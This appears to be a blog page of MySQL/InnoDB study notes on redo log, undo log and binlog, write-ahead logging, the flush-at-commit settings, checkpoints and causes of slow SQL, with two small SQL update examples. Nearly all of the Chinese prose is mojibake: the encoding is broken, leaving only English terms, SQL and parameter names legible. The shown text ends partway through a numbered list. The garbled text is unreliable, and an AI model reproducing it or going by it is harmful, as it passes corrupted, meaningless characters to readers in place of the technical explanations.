<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>å’ŒUndo Logç›¸åï¼ŒRedo Logè®°å½•çš„æ˜¯<strong>æ–°æ•°æ®</strong>çš„å¤‡ä»½ã€‚<strong>åœ¨äº‹åŠ¡æäº¤å‰ï¼Œåªè¦å°†Redo LogæŒä¹…åŒ–å³å¯ï¼Œä¸éœ€è¦å°†æ•°æ®æŒä¹…åŒ–ï¼Œå‡å°‘äº†IOçš„æ¬¡æ•°ã€‚</strong></p>
<p>å…ˆæ¥çœ‹ä¸‹åŸºæœ¬åŸç†ï¼š</p>
<blockquote>
<p><strong>Undo + Redoäº‹åŠ¡çš„ç®€åŒ–è¿‡ç¨‹</strong></p>
</blockquote>
<p> å‡è®¾æœ‰Aã€Bä¸¤ä¸ªæ•°æ®ï¼Œå€¼åˆ†åˆ«ä¸º1,2</p>
<p> A. äº‹åŠ¡å¼€å§‹.<br> B. è®°å½•A&#x3D;1åˆ°undo log buffer.<br> C. ä¿®æ”¹A&#x3D;3.<br> D. è®°å½•A&#x3D;3åˆ°redo log buffer.<br> E. è®°å½•B&#x3D;2åˆ°undo log buffer.<br> F. ä¿®æ”¹B&#x3D;4.<br> G. è®°å½•B&#x3D;4åˆ°redo log buffer.<br> H. å°†undo log bufferå†™å…¥redo log buffer<br> I. å°†redo logå†™å…¥ç£ç›˜<br> J. äº‹åŠ¡æäº¤</p>
<p>K.æœ€åå†å°†æ•°æ®å†™å›ç£ç›˜(ä¸ä¸€å®šç«‹åˆ»å†™å›)</p>
<ul>
<li><p>å¦‚ä½•ä¿è¯åŸå­æ€§ï¼Ÿ</p>
<p>å¦‚æœåœ¨äº‹åŠ¡æäº¤å‰æ•…éšœï¼Œé€šè¿‡undo logæ—¥å¿—æ¢å¤æ•°æ®ã€‚å¦‚æœundo logéƒ½è¿˜æ²¡å†™å…¥ï¼Œé‚£ä¹ˆæ•°æ®å°±å°šæœªæŒä¹…åŒ–ï¼Œæ— éœ€å›æ»š</p>
</li>
<li><p>å¦‚ä½•ä¿è¯æŒä¹…åŒ–ï¼Ÿ</p>
<p>è¿™é‡Œå¹¶æ²¡æœ‰å‡ºç°æ•°æ®çš„æŒä¹…åŒ–ã€‚å› ä¸ºæ•°æ®å·²ç»å†™å…¥redo logï¼Œè€Œredo logæŒä¹…åŒ–åˆ°äº†ç¡¬ç›˜ï¼Œå› æ­¤åªè¦åˆ°äº†Iä»¥åï¼Œäº‹åŠ¡æ˜¯å¯ä»¥æäº¤çš„ã€‚</p>
</li>
<li><p>å†…å­˜ä¸­çš„æ•°æ®åº“æ•°æ®ä½•æ—¶æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Ÿ</p>
<p>å› ä¸ºredo logå·²ç»æŒä¹…åŒ–ï¼Œå› æ­¤æ•°æ®åº“æ•°æ®å†™å…¥ç£ç›˜ä¸å¦å½±å“ä¸å¤§ï¼Œä¸è¿‡ä¸ºäº†é¿å…å‡ºç°è„æ•°æ®ï¼ˆå†…å­˜ä¸­ä¸ç£ç›˜ä¸ä¸€è‡´ï¼‰ï¼Œäº‹åŠ¡æäº¤åä¹Ÿä¼šå°†å†…å­˜æ•°æ®åˆ·å…¥ç£ç›˜ï¼ˆä¹Ÿå¯ä»¥æŒ‰ç…§å›ºè®¾å®šçš„é¢‘ç‡åˆ·æ–°å†…å­˜æ•°æ®åˆ°ç£ç›˜ä¸­ï¼‰ã€‚</p>
</li>
<li><p>æŒä¹…åŒ–redoå’ŒæŒä¹…åŒ–æ•°æ®åº“æ•°æ®æœ‰ä»€ä¹ˆæ€§èƒ½å·®å¼‚ï¼Ÿ</p>
<ul>
<li><p>æ•°æ®åº“æ•°æ®å†™å…¥æ˜¯éšæœºIOï¼Œæ€§èƒ½å¾ˆå·®</p>
</li>
<li><p>redo logåœ¨åˆå§‹åŒ–æ—¶ä¼šå¼€è¾Ÿä¸€æ®µè¿ç»­çš„ç©ºé—´ï¼Œå†™å…¥æ˜¯é¡ºåºIOï¼Œæ€§èƒ½å¾ˆå¥½</p>
</li>
</ul>
</li>
<li><p>redo logä¸­è®°å½•çš„æ•°æ®ï¼Œæœ‰å¯èƒ½å°šæœªæäº¤ï¼Œé‚£ä¹ˆå¦‚ä½•å®Œæˆæ•°æ®æ¢å¤ï¼Ÿ</p>
<p>æ•°æ®æ¢å¤æœ‰ä¸¤ç§ç­–ç•¥ï¼š</p>
<ul>
<li>æ¢å¤æ—¶ï¼Œåªé‡åšå·²ç»æäº¤äº†çš„äº‹åŠ¡</li>
<li>æ¢å¤æ—¶ï¼Œé‡åšæ‰€æœ‰äº‹åŠ¡åŒ…æ‹¬æœªæäº¤çš„äº‹åŠ¡å’Œå›æ»šäº†çš„äº‹åŠ¡ã€‚ç„¶åé€šè¿‡Undo Logå›æ»šé‚£äº›æœªæäº¤çš„äº‹åŠ¡</li>
</ul>
<p>Inodbå¼•æ“é‡‡ç”¨çš„æ˜¯ç¬¬äºŒç§æ–¹æ¡ˆï¼Œå› æ­¤undo logè¦åœ¨ redo logå‰æŒä¹…åŒ–</p>
</li>
<li><p>å†™å…¥æ€§èƒ½çš„ä¼˜åŒ–</p>
<p>äº‹åŠ¡æäº¤å‰éœ€è¦åŒæ—¶å†™å…¥undo logå’Œ redo logï¼ŒåŠ¿å¿…å¢åŠ IOæ¬¡æ•°ï¼Œå› æ­¤å®é™…ä¸Šundo logå¹¶ä¸æ˜¯ç›´æ¥å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯å…ˆå†™å…¥åˆ°redo logä¸­ï¼Œå½“redo logæŒä¹…åŒ–æ—¶ï¼Œundo logå°±åŒæ—¶æŒä¹…åŒ–åˆ°ç¡¬ç›˜äº†ã€‚</p>
<p>å› æ­¤äº‹åŠ¡æäº¤å‰ï¼Œåªéœ€è¦å¯¹redo logæŒä¹…åŒ–å³å¯ã€‚</p>
<p>å¦å¤–ï¼Œredo logå¹¶ä¸æ˜¯å†™å…¥ä¸€æ¬¡å°±æŒä¹…åŒ–ä¸€æ¬¡ï¼Œredo logåœ¨å†…å­˜ä¸­ä¹Ÿæœ‰è‡ªå·±çš„ç¼“å†²æ± ï¼š<code>redo log buffer</code>ã€‚æ¯æ¬¡å†™redo logéƒ½æ˜¯å†™å…¥åˆ°bufferï¼Œåœ¨æäº¤æ—¶ä¸€æ¬¡æ€§æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå‡å°‘IOæ­¤æ—¶ã€‚</p>
</li>
</ul>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><ul>
<li>undo log è®°å½•æ›´æ–°å‰æ•°æ®ï¼Œç”¨äºä¿è¯äº‹åŠ¡åŸå­æ€§</li>
<li>redo log è®°å½•æ›´æ–°åæ•°æ®ï¼Œç”¨äºä¿è¯äº‹åŠ¡çš„æŒä¹…æ€§</li>
<li>redo logæœ‰è‡ªå·±çš„å†…å­˜bufferï¼Œå…ˆå†™å…¥åˆ°bufferï¼Œäº‹åŠ¡æäº¤æ—¶å†™å…¥ç£ç›˜</li>
<li>redo logæŒä¹…åŒ–ä¹‹åï¼Œæ„å‘³ç€äº‹åŠ¡æ˜¯<strong>å¯æäº¤</strong>çš„</li>
</ul>
<h3 id="redo-logæ—¥å¿—æ¨¡å—"><a href="#redo-logæ—¥å¿—æ¨¡å—" class="headerlink" title="redo logæ—¥å¿—æ¨¡å—"></a>redo logæ—¥å¿—æ¨¡å—</h3><p>redo logæ˜¯InnoDBå­˜å‚¨å¼•æ“å±‚çš„æ—¥å¿—ï¼Œåˆç§°é‡åšæ—¥å¿—æ–‡ä»¶ï¼Œç”¨äºè®°å½•äº‹åŠ¡æ“ä½œçš„å˜åŒ–ï¼Œè®°å½•çš„æ˜¯æ•°æ®ä¿®æ”¹ä¹‹åçš„å€¼ï¼Œä¸ç®¡äº‹åŠ¡æ˜¯å¦æäº¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚åœ¨å®ä¾‹å’Œä»‹è´¨å¤±è´¥ï¼ˆmedia failureï¼‰æ—¶ï¼Œredo logæ–‡ä»¶å°±èƒ½æ´¾ä¸Šç”¨åœºï¼Œå¦‚æ•°æ®åº“æ‰ç”µï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šä½¿ç”¨redo logæ¢å¤åˆ°æ‰ç”µå‰çš„æ—¶åˆ»ï¼Œä»¥æ­¤æ¥ä¿è¯æ•°æ®çš„å®Œæ•´æ€§ã€‚</p>
<p>åœ¨ä¸€æ¡æ›´æ–°è¯­å¥è¿›è¡Œæ‰§è¡Œçš„æ—¶å€™ï¼ŒInnoDBå¼•æ“ä¼šæŠŠæ›´æ–°è®°å½•å†™åˆ°redo logæ—¥å¿—ä¸­ï¼Œç„¶åæ›´æ–°å†…å­˜ï¼Œæ­¤æ—¶ç®—æ˜¯è¯­å¥æ‰§è¡Œå®Œäº†ï¼Œç„¶ååœ¨ç©ºé—²çš„æ—¶å€™æˆ–è€…æ˜¯æŒ‰ç…§è®¾å®šçš„æ›´æ–°ç­–ç•¥å°†redo logä¸­çš„å†…å®¹æ›´æ–°åˆ°ç£ç›˜ä¸­ï¼Œè¿™é‡Œæ¶‰åŠåˆ°WALå³Write Ahead loggingæŠ€æœ¯ï¼Œä»–çš„å…³é”®ç‚¹æ˜¯å…ˆå†™æ—¥å¿—ï¼Œå†å†™ç£ç›˜ã€‚</p>
<p>æœ‰äº†redo logæ—¥å¿—ï¼Œé‚£ä¹ˆåœ¨æ•°æ®åº“è¿›è¡Œå¼‚å¸¸é‡å¯çš„æ—¶å€™ï¼Œå¯ä»¥æ ¹æ®redo logæ—¥å¿—è¿›è¡Œæ¢å¤ï¼Œä¹Ÿå°±è¾¾åˆ°äº†crash-safeã€‚</p>
<p>redo logæ—¥å¿—çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œå³è®°å½•æ»¡äº†ä»¥åå°±ä»å¤´å¾ªç¯å†™ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438630.jpg" alt="img"></p>
<p>è¯¥å›¾å±•ç¤ºäº†ä¸€ç»„4ä¸ªæ–‡ä»¶çš„redo logæ—¥å¿—ï¼Œcheckpointä¹‹å‰è¡¨ç¤ºæ“¦é™¤å®Œäº†çš„ï¼Œå³å¯ä»¥è¿›è¡Œå†™çš„ï¼Œæ“¦é™¤ä¹‹å‰ä¼šæ›´æ–°åˆ°ç£ç›˜ä¸­ï¼Œwrite posæ˜¯æŒ‡å†™çš„ä½ç½®ï¼Œå½“write poså’Œcheckpointç›¸é‡çš„æ—¶å€™è¡¨æ˜redo logå·²ç»æ»¡äº†ï¼Œè¿™ä¸ªæ—¶å€™æ•°æ®åº“åœæ­¢è¿›è¡Œæ•°æ®åº“æ›´æ–°è¯­å¥çš„æ‰§è¡Œï¼Œè½¬è€Œè¿›è¡Œredo logæ—¥å¿—åŒæ­¥åˆ°ç£ç›˜ä¸­ã€‚</p>
<h4 id="redo-logæœºåˆ¶ï¼š"><a href="#redo-logæœºåˆ¶ï¼š" class="headerlink" title="redo logæœºåˆ¶ï¼š"></a>redo logæœºåˆ¶ï¼š</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438643.jpg" alt="å¿…é¡»äº†è§£çš„mysqlä¸‰å¤§æ—¥å¿—-binlogã€redo logå’Œundo log"></p>
<ul>
<li>ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€ä¸ªæ˜¯å†…å­˜ä¸­çš„redo log bufferï¼Œå¦ä¸€ä¸ªæ˜¯ç£ç›˜çš„ redo log file</li>
<li>æ¯æ¬¡å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œå…ˆå†™è¿›bufferä¸­ï¼Œåç»­æŸä¸ªæ—¶é—´ç‚¹å†ä¸€æ¬¡å°†å¤šä¸ªæ“ä½œè®°å½•å†™åˆ°redo log fileä¸­</li>
<li>ä¸‰ç§å†™å…¥çº§åˆ«<ul>
<li>å»¶è¿Ÿå†™ï¼Œå»¶è¿Ÿåˆ·æ–°ï¼Œå‚æ•°0ï¼Œé€‚åˆæ™®é€šæ•°æ®ï¼Œæ¯éš”ä¸€ç§’åˆ·æ–°åˆ°ç£ç›˜ä¸€æ¬¡</li>
<li>å®æ—¶å†™ï¼Œå®æ—¶åˆ·æ–°ï¼Œå‚æ•°1ï¼Œé€‚åˆé‡‘èæ•°æ®ï¼Œå†™åˆ°å†…å­˜çš„åŒæ—¶ç›´æ¥åˆ·æ–°åˆ°ç£ç›˜</li>
<li>å®æ—¶å†™ï¼Œå»¶è¿Ÿåˆ·æ–°ï¼Œå‚æ•°2ï¼Œé€‚åˆè®¢å•æ•°æ®ï¼Œæ¯æ¬¡æäº¤ç«‹é©¬å†™å…¥os bufferï¼Œæ¯éš”ä¸€ç§’åˆ·åˆ°ç£ç›˜</li>
</ul>
</li>
</ul>
<h3 id="binlogæ—¥å¿—æ¨¡å—"><a href="#binlogæ—¥å¿—æ¨¡å—" class="headerlink" title="binlogæ—¥å¿—æ¨¡å—"></a>binlogæ—¥å¿—æ¨¡å—</h3><p>binlogæ˜¯å±äºMySQL Serverå±‚é¢çš„ï¼Œåˆç§°ä¸ºå½’æ¡£æ—¥å¿—ï¼Œå±äºé€»è¾‘æ—¥å¿—ï¼Œæ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è®°å½•çš„æ˜¯è¿™ä¸ªè¯­å¥çš„åŸå§‹é€»è¾‘ï¼Œä¾é binlogæ˜¯æ²¡æœ‰crash-safeèƒ½åŠ›çš„</p>
<h3 id="redo-logå’ŒbinlogåŒºåˆ«"><a href="#redo-logå’ŒbinlogåŒºåˆ«" class="headerlink" title="redo logå’ŒbinlogåŒºåˆ«"></a>redo logå’ŒbinlogåŒºåˆ«</h3><ul>
<li>redo logæ˜¯å±äºinnoDBå±‚é¢ï¼Œbinlogå±äºMySQL Serverå±‚é¢çš„ï¼Œè¿™æ ·åœ¨æ•°æ®åº“ç”¨åˆ«çš„å­˜å‚¨å¼•æ“æ—¶å¯ä»¥è¾¾åˆ°ä¸€è‡´æ€§çš„è¦æ±‚ã€‚</li>
<li>redo logæ˜¯ç‰©ç†æ—¥å¿—ï¼Œè®°å½•è¯¥æ•°æ®é¡µæ›´æ–°çš„å†…å®¹ï¼›binlogæ˜¯é€»è¾‘æ—¥å¿—ï¼Œè®°å½•çš„æ˜¯è¿™ä¸ªæ›´æ–°è¯­å¥çš„åŸå§‹é€»è¾‘ã€‚</li>
<li>redo logæ˜¯å¾ªç¯å†™ï¼Œæ—¥å¿—ç©ºé—´å¤§å°å›ºå®šï¼›binlogæ˜¯è¿½åŠ å†™ï¼Œæ˜¯æŒ‡ä¸€ä»½å†™åˆ°ä¸€å®šå¤§å°çš„æ—¶å€™ä¼šæ›´æ¢ä¸‹ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸ä¼šè¦†ç›–ã€‚</li>
<li>binlogå¯ä»¥ä½œä¸ºæ¢å¤æ•°æ®ä½¿ç”¨ï¼Œä¸»ä»å¤åˆ¶æ­å»ºï¼Œredo logä½œä¸ºå¼‚å¸¸å®•æœºæˆ–è€…ä»‹è´¨æ•…éšœåçš„æ•°æ®æ¢å¤ä½¿ç”¨ã€‚</li>
</ul>
<h3 id="redo-log-1"><a href="#redo-log-1" class="headerlink" title="redo log"></a>redo log</h3><p><strong>ä½œç”¨ï¼š</strong></p>
<p>ç¡®ä¿äº‹åŠ¡çš„æŒä¹…æ€§ã€‚é˜²æ­¢åœ¨å‘ç”Ÿæ•…éšœçš„æ—¶é—´ç‚¹ï¼Œå°šæœ‰è„é¡µæœªå†™å…¥ç£ç›˜ï¼Œåœ¨é‡å¯mysqlæœåŠ¡çš„æ—¶å€™ï¼Œæ ¹æ®redo logè¿›è¡Œé‡åšï¼Œä»è€Œè¾¾åˆ°äº‹åŠ¡çš„æŒä¹…æ€§è¿™ä¸€ç‰¹æ€§ã€‚</p>
<p>redo logé€šå¸¸æ˜¯ç‰©ç†æ—¥å¿—ï¼Œè®°å½•çš„æ˜¯æ•°æ®é¡µçš„ç‰©ç†ä¿®æ”¹ï¼Œè€Œä¸æ˜¯æŸä¸€è¡Œæˆ–æŸå‡ è¡Œä¿®æ”¹æˆæ€æ ·ï¼Œå®ƒç”¨æ¥æ¢å¤æäº¤åçš„ç‰©ç†æ•°æ®é¡µï¼ˆæ¢å¤æ•°æ®é¡µï¼Œä¸”åªèƒ½æ¢å¤åˆ°æœ€åä¸€æ¬¡æäº¤çš„ä½ç½®ï¼‰ã€‚</p>
<h3 id="undo-log-1"><a href="#undo-log-1" class="headerlink" title="undo log"></a>undo log</h3><p><strong>ä½œç”¨ï¼š</strong></p>
<p>ä¿å­˜äº†äº‹åŠ¡å‘ç”Ÿä¹‹å‰çš„æ•°æ®çš„ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¯ä»¥ç”¨äºå›æ»šï¼ŒåŒæ—¶å¯ä»¥æä¾›å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ä¸‹çš„è¯»ï¼ˆMVCCï¼‰ï¼Œä¹Ÿå³éé”å®šè¯»ã€‚</p>
<p>undoç”¨æ¥å›æ»šè¡Œè®°å½•åˆ°æŸä¸ªç‰ˆæœ¬ã€‚undo logä¸€èˆ¬æ˜¯é€»è¾‘æ—¥å¿—ï¼Œæ ¹æ®æ¯è¡Œè®°å½•è¿›è¡Œè®°å½•ã€‚</p>
<h3 id="binlog-ç›‘å¬binary-log"><a href="#binlog-ç›‘å¬binary-log" class="headerlink" title="binlog   ç›‘å¬binary log"></a>binlog   ç›‘å¬binary log</h3><p><strong>ä½œç”¨ï¼š</strong></p>
<p>ç”¨äºå¤åˆ¶ï¼Œåœ¨ä¸»ä»å¤åˆ¶ä¸­ï¼Œä»åº“åˆ©ç”¨ä¸»åº“ä¸Šçš„binlogè¿›è¡Œé‡æ’­ï¼Œå®ç°ä¸»ä»åŒæ­¥ã€‚<br>ç”¨äºæ•°æ®åº“çš„åŸºäºæ—¶é—´ç‚¹çš„è¿˜åŸã€‚</p>
<p><a href="https://blog.csdn.net/u012834750/article/details/79533866">https://blog.csdn.net/u012834750/article/details/79533866</a></p>
<p>æ•°æ®åº“æ•°æ®å­˜æ”¾çš„æ–‡ä»¶ç§°ä¸ºdata fileï¼›æ—¥å¿—æ–‡ä»¶ç§°ä¸ºlog fileï¼›æ•°æ®åº“æ•°æ®æ˜¯æœ‰ç¼“å­˜çš„ï¼Œå¦‚æœæ²¡æœ‰ç¼“å­˜ï¼Œæ¯æ¬¡éƒ½å†™æˆ–è€…è¯»ç‰©ç†diskï¼Œé‚£æ€§èƒ½å°±å¤ªä½ä¸‹äº†ã€‚æ•°æ®åº“æ•°æ®çš„ç¼“å­˜ç§°ä¸ºdata bufferï¼Œæ—¥å¿—ï¼ˆredoï¼‰ç¼“å­˜ç§°ä¸ºlog bufferï¼›æ—¢ç„¶æ•°æ®åº“æ•°æ®æœ‰ç¼“å­˜ï¼Œå°±å¾ˆéš¾ä¿è¯ç¼“å­˜æ•°æ®ï¼ˆè„æ•°æ®ï¼‰ä¸ç£ç›˜æ•°æ®çš„ä¸€è‡´æ€§ã€‚æ¯”å¦‚æŸæ¬¡æ•°æ®åº“æ“ä½œï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> T <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span> <span class="keyword">where</span> ID<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>æ›´æ–°ageå­—æ®µçš„æ•°æ®ä¼šå­˜æ”¾åœ¨ç¼“å­˜ä¸­ï¼Œç­‰å¾…å­˜å‚¨å¼•æ“å°†ageåˆ·æ–°data_fileï¼Œå¹¶è¿”å›ç»™ä¸šåŠ¡æ–¹æ›´æ–°æˆåŠŸã€‚å¦‚æœæ­¤æ—¶æ•°æ®åº“å®•æœºï¼Œç¼“å­˜ä¸­çš„æ•°æ®å°±ä¸¢å¤±äº†ï¼Œä¸šåŠ¡æ–¹å´ä»¥ä¸ºæ›´æ–°æˆåŠŸäº†ï¼Œæ•°æ®ä¸ä¸€è‡´ï¼Œä¹Ÿæ²¡æœ‰æŒä¹…åŒ–å­˜å‚¨ã€‚</p>
<p>ä¸Šé¢çš„é—®é¢˜å°±å¯ä»¥é€šè¿‡äº‹åŠ¡çš„ACIDç‰¹æ€§æ¥ä¿è¯ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> T <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span> <span class="keyword">where</span> ID<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ‰§è¡Œåï¼Œæ›´æ–°è¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆå¤±è´¥ã€‚ä¸šåŠ¡æ–¹çš„è¿”å›å’Œæ•°æ®åº“data fileä¸­çš„æ•°æ®ä¿æŒä¸€è‡´ã€‚è¦ä¿è¯è¿™æ ·çš„ç‰¹æ€§å¾—é innodbçš„redoå’Œundoæ—¥å¿—ã€‚</p>
<p>redoæ—¥å¿—ã€undoæ—¥å¿—ï¼š</p>
<p>å­˜å‚¨å¼•æ“ä¹Ÿä¼šä¸ºredo undoæ—¥å¿—å¼€è¾Ÿå†…å­˜ç¼“å­˜ç©ºé—´ï¼Œlog bufferã€‚ç£ç›˜ä¸Šçš„æ—¥å¿—æ–‡ä»¶ç§°ä¸ºlog fileï¼Œæ˜¯é¡ºåºè¿½åŠ çš„ï¼Œæ€§èƒ½éå¸¸é«˜ï¼Œæ³¨ï¼šç£ç›˜çš„é¡ºåºå†™æ€§èƒ½æ¯”å†…å­˜çš„å†™æ€§èƒ½å·®ä¸äº†å¤šå°‘ã€‚</p>
<p>undoæ—¥å¿—ç”¨äºè®°å½•äº‹åŠ¡å¼€å§‹å‰çš„çŠ¶æ€ï¼Œç”¨äºäº‹åŠ¡å¤±è´¥æ—¶çš„å›æ»šæ“ä½œï¼›redoæ—¥å¿—è®°å½•äº‹åŠ¡æ‰§è¡Œåçš„çŠ¶æ€ï¼Œç”¨æ¥æ¢å¤æœªå†™å…¥data fileçš„å·²æˆåŠŸäº‹åŠ¡æ›´æ–°çš„æ•°æ®ã€‚ä¾‹å¦‚æŸä¸€äº‹åŠ¡çš„äº‹åŠ¡åºå·ä¸ºT1ï¼Œå…¶å¯¹æ•°æ®Xè¿›è¡Œä¿®æ”¹ï¼Œè®¾Xçš„åŸå€¼æ˜¯5ï¼Œä¿®æ”¹åçš„å€¼ä¸º15ï¼Œé‚£ä¹ˆUndoæ—¥å¿—ä¸º&lt;T1, X, 5&gt;ï¼ŒRedoæ—¥å¿—ä¸º&lt;T1, X, 15&gt;ã€‚</p>
<p>äº‹åŠ¡æ‰§è¡Œçš„å„ä¸ªé˜¶æ®µï¼š</p>
<p>ï¼ˆ1ï¼‰å†™undoæ—¥å¿—åˆ°log bufferï¼›</p>
<p>ï¼ˆ2ï¼‰æ‰§è¡Œäº‹åŠ¡ï¼Œå¹¶å†™redoæ—¥å¿—åˆ°log bufferï¼›</p>
<p>ï¼ˆ3ï¼‰å¦‚æœinnodb_flush_log_at_trx_commit&#x3D;1ï¼Œåˆ™å°†redoæ—¥å¿—å†™åˆ°log fileï¼Œå¹¶åˆ·æ–°ç£ç›˜ã€‚</p>
<p>ï¼ˆ4ï¼‰æäº¤äº‹åŠ¡ã€‚</p>
<p>ä¸ºä»€ä¹ˆæ²¡æœ‰å†™data fileï¼Œäº‹åŠ¡å°±æäº¤äº†ï¼Ÿ</p>
<p>åœ¨æ•°æ®åº“çš„ä¸–ç•Œé‡Œï¼Œæ•°æ®ä»æ¥éƒ½ä¸é‡è¦ï¼Œæ—¥å¿—æ‰æ˜¯æœ€é‡è¦çš„ï¼Œæœ‰äº†æ—¥å¿—å°±æœ‰äº†ä¸€åˆ‡ã€‚</p>
<p>å› ä¸ºdata bufferä¸­çš„æ•°æ®ä¼šåœ¨åˆé€‚çš„æ—¶é—´ç”±å­˜å‚¨å¼•æ“å†™å…¥åˆ°data fileï¼Œå¦‚æœåœ¨å†™å…¥ä¹‹å‰ï¼Œæ•°æ®åº“å®•æœºäº†ï¼Œæ ¹æ®ç£ç›˜çš„redoæ—¥å¿—ï¼Œå®Œå…¨å¯ä»¥å°†äº‹åŠ¡æ›´æ”¹çš„æ•°æ®æ¢å¤ã€‚å…ˆæŒä¹…åŒ–æ—¥å¿—çš„ç­–ç•¥å«åšWrite Ahead Logï¼Œå³é¢„å†™æ—¥å¿—ã€‚</p>
<p>åˆ†æå‡ ç§å¼‚å¸¸æƒ…å†µï¼š</p>
<ul>
<li>innodb_flush_log_at_trx_commit&#x3D;2ï¼ˆ<a href="http://link.zhihu.com/?target=https://mp.weixin.qq.com/s?__biz=MzU4NjQwNTE5Ng==&mid=2247483681&idx=1&sn=03adfb89521568013f6a1efd9ca1af6a&scene=21%23wechat_redirect">innodb_flush_log_at_trx_commitå’Œsync_binlogå‚æ•°è¯¦è§£</a>ï¼‰æ—¶ï¼Œå°†redoæ—¥å¿—å†™å…¥logfileåï¼Œä¸ºæå‡äº‹åŠ¡æ‰§è¡Œçš„æ€§èƒ½ï¼Œå­˜å‚¨å¼•æ“å¹¶æ²¡æœ‰è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿçš„syncæ“ä½œï¼Œå°†æ—¥å¿—è½ç›˜ã€‚å¦‚æœæ­¤æ—¶å®•æœºäº†ï¼Œé‚£ä¹ˆæœªè½ç›˜redoæ—¥å¿—äº‹åŠ¡çš„æ•°æ®æ˜¯æ— æ³•ä¿è¯ä¸€è‡´æ€§çš„ã€‚</li>
<li>undoæ—¥å¿—åŒæ ·å­˜åœ¨æœªè½ç›˜çš„æƒ…å†µï¼Œå¯èƒ½å‡ºç°æ— æ³•å›æ»šçš„æƒ…å†µã€‚</li>
</ul>
<p>checkpointï¼š</p>
<p>checkpointæ˜¯ä¸ºäº†å®šæœŸå°†db bufferçš„å†…å®¹åˆ·æ–°åˆ°data fileã€‚å½“é‡åˆ°å†…å­˜ä¸è¶³ã€db bufferå·²æ»¡ç­‰æƒ…å†µæ—¶ï¼Œéœ€è¦å°†db bufferä¸­çš„å†…å®¹&#x2F;éƒ¨åˆ†å†…å®¹ï¼ˆç‰¹åˆ«æ˜¯è„æ•°æ®ï¼‰è½¬å‚¨åˆ°data fileä¸­ã€‚åœ¨è½¬å‚¨æ—¶ï¼Œä¼šè®°å½•checkpointå‘ç”Ÿçš„â€æ—¶åˆ»â€œã€‚åœ¨æ•…éšœæ¢å¤çš„æ—¶å€™ï¼Œåªéœ€è¦redo&#x2F;undoæœ€è¿‘çš„ä¸€æ¬¡checkpointä¹‹åçš„æ“ä½œã€‚</p>
<p><a href="https://blog.csdn.net/bluejoe2000/article/details/80349499">https://blog.csdn.net/bluejoe2000/article/details/80349499</a></p>
<h2 id="ä¸€æ¡SQLæ‰§è¡Œå¾ˆæ…¢çš„åŸå› æœ‰å“ªäº›"><a href="#ä¸€æ¡SQLæ‰§è¡Œå¾ˆæ…¢çš„åŸå› æœ‰å“ªäº›" class="headerlink" title="ä¸€æ¡SQLæ‰§è¡Œå¾ˆæ…¢çš„åŸå› æœ‰å“ªäº›?"></a>ä¸€æ¡SQLæ‰§è¡Œå¾ˆæ…¢çš„åŸå› æœ‰å“ªäº›?</h2><p>åˆ†ä¸¤ç±»è®¨è®º</p>
<h3 id="å¤§å¤šæ•°æƒ…å†µæ­£å¸¸-åªæ˜¯å¶å°”å‡ºç°å¾ˆæ…¢çš„æƒ…å†µ"><a href="#å¤§å¤šæ•°æƒ…å†µæ­£å¸¸-åªæ˜¯å¶å°”å‡ºç°å¾ˆæ…¢çš„æƒ…å†µ" class="headerlink" title="å¤§å¤šæ•°æƒ…å†µæ­£å¸¸,åªæ˜¯å¶å°”å‡ºç°å¾ˆæ…¢çš„æƒ…å†µ"></a>å¤§å¤šæ•°æƒ…å†µæ­£å¸¸,åªæ˜¯å¶å°”å‡ºç°å¾ˆæ…¢çš„æƒ…å†µ</h3><ol>
<li>æ•°æ®åº“åœ¨åˆ·è„é¡µ</li>
</ol>
<p>åˆ·è„é¡µæœ‰4ç§æƒ…å†µ:</p>
<ul>
<li>redologå†™æ»¡äº†ã€‚</li>
<li>å†…å­˜ä¸å¤Ÿç”¨äº†ï¼šå¦‚æœä¸€æ¬¡æŸ¥è¯¢è¾ƒå¤šçš„æ•°æ®ï¼Œæ°å¥½ç¢°åˆ°æ‰€æŸ¥çš„æ•°æ®é¡µä¸åœ¨å†…å­˜ä¸­ï¼Œéœ€è¦ç”³è¯·å†…å­˜ï¼Œè€Œæ­¤æ—¶æ°å¥½å†…å­˜ä¸è¶³çš„æ—¶å€™å°±éœ€è¦æ·˜æ±°ä¸€éƒ¨åˆ†å†…å­˜æ•°æ®é¡µï¼Œå¦‚æœæ˜¯å¹²å‡€é¡µï¼Œå°±ç›´æ¥é‡Šæ”¾ï¼Œå¦‚æœæ°å¥½æ˜¯è„é¡µå°±éœ€è¦åˆ·è„é¡µã€‚</li>
<li>mysqlè®¤ä¸ºç³»ç»Ÿç©ºé—²çš„æ—¶å€™ã€‚</li>
<li>mysqlæ­£å¸¸å…³é—­çš„æ—¶å€™ã€‚</li>
</ul>
<ol start="2">
<li>æ‹¿ä¸åˆ°é”</li>
</ol>
